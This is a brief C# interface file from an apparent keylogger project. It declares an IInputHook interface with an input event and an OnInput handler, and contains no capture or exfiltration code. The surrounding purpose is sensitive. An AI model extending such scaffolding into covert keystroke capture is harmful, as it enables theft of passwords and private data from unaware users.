using System;
using KeyLogger.Messages;

namespace KeyLogger.Catcher.Hooks
{
    public interface IInputHook : IDisposable
    {
        event EventHandler<HookEventArgs> InputEvent;

        void OnInput(InputMessage inputmessage);
    }
}